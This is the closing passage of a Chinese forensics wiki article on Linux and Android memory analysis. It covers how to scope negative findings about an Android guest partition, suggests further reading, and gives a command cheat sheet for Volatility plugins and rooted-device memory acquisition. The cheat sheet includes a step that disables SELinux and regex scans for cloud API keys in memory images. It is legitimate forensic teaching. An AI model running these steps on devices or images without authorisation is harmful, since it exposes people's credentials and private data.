| 访客在机主分区下的临时文件 | 本次未检索该模式 | 未覆盖 |
| 非当前登录用户的凭据缓存 | 受 Android 沙盒与用户隔离保护 | 未覆盖 |
| Secure Folder（安全文件夹） | 独立加密空间，需另行提取 | 未覆盖 |

**准确表述**：「在 `DigiForensics-mem.raw` 采集窗口（2026-03-15 10:12:33 前后）内，对全镜像字符串执行 `/data/user/10/` 路径检索，**未发现**访客分区在采集时刻有活动数据驻留内存。结合磁盘侧该分区存在 412 KB 系统缓存且无任何应用数据库，可推断访客模式曾被启用并正常使用，但**不排除**更早时段存在已被清理或已换出的访客数据。」

**误判对照**

这个案例的核心误判是：**把 5.2 的结论范围默认为"这台设备"。**

判据在**分区标识**这个字段上。

本次 5.2 中每条路径证据都带 `/data/user/0/` 前缀，`dumpsys` 也明确给出 `userId=0`。前缀 `0` 不是格式细节，它界定了结论的适用范围。

一份只写"该设备上发现了…"而不提用户分区的报告，结论实际上只覆盖了设备的一部分。

正确的阴性结论写法必须包含四个要素，缺一个就不成立：

1. **范围** —— 哪个分区/哪个会话/哪个时间段
2. **检查方法** —— 用了哪个插件、检索了什么模式、覆盖多大空间
3. **未覆盖清单** —— 明确列出没查的部分
4. **检查结果** —— 命中数与形态

对比：

| 不合格 | 合格 |
|---|---|
| 未发现其他使用者痕迹 | 在采集窗口内检索 `/data/user/10/` 路径零命中；访客分区的历史数据、已换出页面、Secure Folder 未覆盖 |

第二个误判方向更重要：**把"内存里没有"当成"没有发生过"。**

`/data/user/10/` 在内存中零命中，有多个完全不同的解释：访客当时未使用、访客的数据已换出到闪存、访客数据在会话退出时已被清理、访客使用了 Secure Folder（独立加密空间不经过常规路径）。

**这四种解释在内存中不可区分。**

判据是**必须用独立来源交叉**：本例用了磁盘侧的分区存在性与内容清单，把"内存零命中"从"访客未使用"收窄到"当前未驻留 + 分区曾被使用"。

如果只有内存一个来源，这个结论连"中"强度都达不到。

按错误判据走的代价很实际：委托方拿"内存里没有"当结论去追责机主，而实际数据可能存在于未换出的加密分区里。

这是凭阴性结论造成实际损害的典型路径 —— 比漏报更严重。

第三个纪律：本次的阴性结论有一半强度来自磁盘侧。如果只送了内存镜像、没有磁盘镜像，这个结论的强度会从"中"掉到"很弱"。

报告里应当写明每条结论依赖哪些检材，让委托方知道"如果你只有内存镜像，这条结论支撑不住"。

<a id="section-44"></a>

## 六、扩展阅读方向

Linux 与 Android 内存取证的困难集中在**不可自动化的前置工作**上：符号必须自建、用户态不是标准栈、容量与权限约束更紧。下面四组材料按这几条主线组织。

<a id="section-45"></a>

### 6.1 符号自建：唯一的硬前置

这一组解决"符号备不齐，后面全废"的问题。Windows 侧能自动下载，Linux 侧不能——发行版 dbgsym 包、裁剪内核、BTF 与 DWARF 的取舍都决定了你能不能开工。

- [Windows 内存 Profile 机制](../memory-acquire/memory-acquire-windows-profile.md)——符号层在整条分析链路中的位置，Windows 侧的自动下载机制，以及内网方案思路的迁移价值。
- [Volatility 3 框架与插件选择](../memory-acquire/memory-acquire-volatility3.md)——ISF 在框架中的消费方式，Linux 插件族与 Windows 插件族的差异。
- [proc 虚拟文件系统取证](../../computer/computer-shell/computer-shell-proc.md)——`/proc` 的结构基础，理解内核如何把运行时状态导出成文件。
- [包管理器与软件清单](../../computer/computer-persistence/computer-persistence-package-manager-and-software-inventory.md)——dbgsym 与内核头文件的来源，以及发行版差异化对符号构建的影响。
- [内核日志深度分析](../../computer/computer-log/computer-log-system-log-analysis.md)——符号缺失时的替代面，内核版本与构建信息可从日志侧确认。

<a id="section-46"></a>

### 6.2 落盘对照：内存与 `/proc` 互证

这一组解决"内存侧结论怎么被独立支撑"。`/proc` 的磁盘快照、systemd 日志、持久化载体，三者与内存结果构成交叉；rootkit 检测里那些"刻意隐藏"的信号，也需要落盘侧的完整性证据来对照。

- [Shell 痕迹与命令历史](../../computer/computer-shell/computer-shell-shell.md)——磁盘侧的 bash 历史与内存侧 `linux.bash` 的覆盖差异，删除行为的可见性。
- [时间线重建（Linux）](../../computer/computer-log/computer-log-linux-timeline-reconstruction.md)——Linux 侧的时间线方法，跨源合并的技术路线。
- [反取证手法与时间戳篡改检测](../../fundamentals/fundamentals-concepts/fundamentals-concepts-anti-forensics-and-timestamp-tampering.md)——`touch`、`utimensat` 与内存时间字段矛盾时的判读。
- [计划任务与持久化痕迹](../../computer/computer-persistence/computer-persistence-scheduled-tasks-and-persistence.md)——rootkit 之外的常规驻留方式，隐藏进程的对照面。
- [SSH 痕迹与密钥取证](../../computer/computer-persistence/computer-persistence-ssh.md)——SSH 通道的痕迹，横向移动的常见路径。
- [文件头与文件签名](../../filesystem/filesystem-ntfs/filesystem-ntfs-file-headers-and-signatures.md)——从内存导出的对象做类型判定，避免把任意字节当可执行文件分析。

<a id="section-47"></a>

### 6.3 Android 侧深化

这一组专门处理 Android。它既不是 Linux 也不是 Windows：内核是 Linux 的，用户态是 ART 的，采集门槛又是移动设备那一套。

- [内存采集方法](../memory-acquire/memory-acquire-memory-acquisition-methods.md)——root、SELinux、`/dev/crash`、边充边采，以及已锁定设备无解的现实。
- [F2FS 结构](../../filesystem/filesystem-mobile-fs/filesystem-mobile-fs-f2fs.md)——data 分区的落盘结构，内存取不到的内容回到这里找。
- [FAT 系列结构](../../filesystem/filesystem-mobile-fs/filesystem-mobile-fs-fat.md)——SD 卡与外置存储的落盘形态。
- [取证装备与写保护器](../../fundamentals/fundamentals-practice/fundamentals-practice-forensics-equipment-and-write-blockers.md)——移动设备现场的特殊约束：电池、温度、连接稳定性；提取物的存储与访问隔离。
- [合规授权与法律边界](../../fundamentals/fundamentals-practice/fundamentals-practice-legal-authorization-and-boundaries.md)——root 设备、绕过锁屏、提取他人设备数据各自的授权边界。

<a id="section-48"></a>

### 6.4 结论边界与跨介质补充

这一组回答"结论能说到什么程度"，以及"内存之外还有什么可用"。阴性发现的写法、能力边界的交代、跨介质的补充证据都在这里。

- [内存证据的可采性与报告](memory-artifact-memory-evidence-and-reporting.md)——阴性发现的限定写法、采集副作用的披露要求，Android 场景尤其突出。
- [取证概念与分类](../../fundamentals/fundamentals-concepts/fundamentals-concepts-digital-forensics-concepts.md)——内存侧与 `/proc` 侧证据的分类与效力差异，以及它与行为归因之间的距离。
- [取证流程与原则](../../fundamentals/fundamentals-process/fundamentals-process-five-stage-forensics-process.md)——可复现性要求，符号构建过程本身必须留痕。
- [证据格式与转换](../../imaging/imaging-acquire/imaging-acquire-evidence-image-formats.md)——LiME 格式与压缩镜像的处理，Android 侧常用。
<a id="section-49"></a>

## 七、命令速查

```bash
# ===== 1. 符号准备（Linux 的前置工作）=====
uname -r                                             # 内核版本
ls -la /sys/kernel/btf/vmlinux 2>/dev/null            # 是否有 BTF

# 路线 A：btf2json（Rust 独立工具，推荐；注意它不是 dwarf2json）
cargo install --locked --path /path/to/btf2json       # 或从发行版预编译包安装
btf2json --btf /sys/kernel/btf/vmlinux \
  --map /boot/System.map-$(uname -r) \
  --arch x86_64 --banner "$(uname -r)" > /opt/isf/linux/$(uname -r).json

# 路线 B：dwarf2json（Go；只有 --elf/--elf-symbols/--elf-types/--system-map）
git clone https://github.com/volatilityfoundation/dwarf2json.git
cd dwarf2json && go build .
./dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-$(uname -r) \
  > /opt/isf/linux/$(uname -r).json

python3 vol.py -f DigiForensics-mem.raw -s /opt/isf isfinfo   # 确认加载了哪个

# ===== 2. 进程、痕迹与网络 =====
V="python3 vol.py -f DigiForensics-mem.raw -s /opt/isf"
$V linux.pslist ; $V linux.pstree ; $V linux.psaux ; $V linux.proc.Maps
$V linux.bash      # 含时间戳
$V linux.envars    # 常含密钥
$V linux.kmsg ; $V linux.mountinfo ; $V linux.lsof ; $V linux.kallsyms
# 摘链检测：pslist 遍历链表，psscan 扫描内存；只有"psscan 有、pslist 无"才是隐藏
$V linux.pslist | awk '{print $2}' | sort -u > /tmp/l.txt
$V linux.psscan | awk '{print $2}' | sort -u > /tmp/s.txt
comm -13 /tmp/l.txt /tmp/s.txt
# 网络（Linux 侧没有 netscan！）
$V linux.sockstat   # 当前活动
$V linux.sockscan   # 池扫描（有 stale data）
$V linux.ip.Addr ; $V linux.ip.Link

# ===== 3. rootkit 三层排查（用 linux.malware.* 规范名）=====
$V linux.lsmod
$V linux.malware.check_modules ; $V linux.malware.hidden_modules ; $V linux.malware.modxview
$V linux.malware.check_syscall ; $V linux.malware.check_idt ; $V linux.malware.check_afinfo
$V linux.malware.tty_check ; $V linux.malware.process_spoofing ; $V linux.malware.malfind

# ===== 4. Android 采集 =====
adb shell su -c "id"                        # 确认 root
adb shell getenforce                        # SELinux 状态
adb shell su -c "setenforce 0"              # 放行（记录此变更！）
adb push avml /data/local/tmp/
adb shell su -c "chmod 755 /data/local/tmp/avml"
adb shell su -c "/data/local/tmp/avml /sdcard/DigiForensics-mem.raw"
adb pull /sdcard/DigiForensics-mem.raw
adb shell su -c "rm -f /sdcard/DigiForensics-mem.raw /data/local/tmp/avml"

# ===== 5. Android 初筛（完整脚本见第三章；必须分块扫描）=====
IMG=DigiForensics-mem.raw
scan_img 'frida-agent|gum-js-loop|re\.frida'          /tmp/t1.txt
scan_img '/data/local/tmp/.*\.so'                     /tmp/t2.txt 8
scan_img 'magisk|supersu|xposed|cydia'                /tmp/t6.txt
scan_img 'AIza[0-9A-Za-z_-]{35}|AKIA[0-9A-Z]{16}'     /tmp/t5.txt

# ===== 6. ART 映射判读 =====
$V linux.proc.Maps > /work/maps.txt
grep -E 'dalvik-main space|dalvik-LinearAlloc' /work/maps.txt   # 正常
grep -E '/data/local/tmp/' /work/maps.txt                         # 可疑
grep -E '\[anon' /work/maps.txt | grep -viE 'dalvik|scudo|jit-code'   # 匿名可执行
```

---

📌 **版权与引用声明**

本文为 DigiForensics 独立创作的知识条目，采用 [知识共享 署名-相同方式共享 4.0 国际](https://creativecommons.org/licenses/by-sa/4.0/deed.zh-hans) 许可协议发布。

- **署名**：引用本文时请注明「DigiForensics Wiki — 内存与专项分析 — Linux 与 Android 内存取证」
- **相同方式共享**：衍生作品须采用相同协议发布

示例：`本文内容参考自 DigiForensics Wiki《Linux 与 Android 内存取证》（CC BY-SA 4.0）`

文中 `DigiForensics-mem.raw`、`avml` 等均为示例文件名，指向虚构或已脱敏的检材，与真实案件无关。

---
